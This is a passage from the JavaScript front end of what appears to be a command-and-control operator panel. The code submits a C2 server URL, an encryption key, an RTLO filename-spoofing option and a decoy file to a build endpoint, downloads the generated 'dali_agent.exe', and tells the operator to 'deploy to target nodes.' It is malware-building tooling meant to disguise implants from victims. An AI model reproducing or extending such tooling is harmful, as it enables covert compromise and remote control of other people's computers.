              if (prog < 95) {
                  prog += (95 - prog) * 0.1;
                  progressFill.style.width = `${prog}%`;
              }
          }, 3000);

          try {
              const formData = new FormData();
              formData.append('c2_url', url);
              formData.append('aes_key', key);
              formData.append('identity', identity);
              formData.append('rtlo', rtlo);
              if (decoyFile) {
                  formData.append('decoy', decoyFile);
              }

              const response = await fetch('/operator/build', {
                  method: 'POST',
                  headers: {
                      'Authorization': `Bearer ${accessToken}`
                  },
                  body: formData
              });

              clearInterval(progInterval);

              if (!response.ok) {
                  const err = await response.json();
                  throw new Error(err.detail || "Orchestration Build Failed");
              }

              // Finalize progress
              progressFill.style.width = '100%';

              // Extract filename from header (supporting filename* as well)
              const disposition = response.headers.get('Content-Disposition');
              let filename = "dali_agent.exe";
              if (disposition) {
                  const match = disposition.match(/filename\*=UTF-8''([^;]+)/i);
                  if (match) {
                      filename = decodeURIComponent(match[1]);
                  } else {
                      const simpleMatch = disposition.match(/filename="?([^";]+)"?/i);
                      if (simpleMatch) filename = simpleMatch[1];
                  }
              }

              const blob = await response.blob();
              const downloadUrl = window.URL.createObjectURL(blob);
              const a = document.createElement('a');
              a.href = downloadUrl;
              a.download = filename;
              document.body.appendChild(a);
              a.click();
              a.remove();
              
              statusPill.innerText = "Success";
              statusPill.style.background = 'rgba(34, 197, 94, 0.1)';
              statusPill.style.color = 'var(--success)';
              statusText.innerText = "Payload generated and downloaded successfully. Deploy to target nodes.";
              statusPill.classList.remove('building-pulse');

              setTimeout(() => {
                  progressContainer.style.display = 'none';
                  progressFill.style.width = '0%';
              }, 3000);

          } catch (e) {
              clearInterval(progInterval);
              statusPill.innerText = "Failed";
              statusPill.style.background = 'rgba(239, 68, 68, 0.1)';
              statusPill.style.color = 'var(--danger)';
              statusText.innerText = `Build Error: ${e.message}`;
              statusPill.classList.remove('building-pulse');
              progressContainer.style.display = 'none';
          } finally {
              btn.disabled = false;
              btn.style.opacity = '1';
          }
      }

      connectWebSocket();
      fetchAgents();
      fetchStats();
    </script>
  </body>
</html>
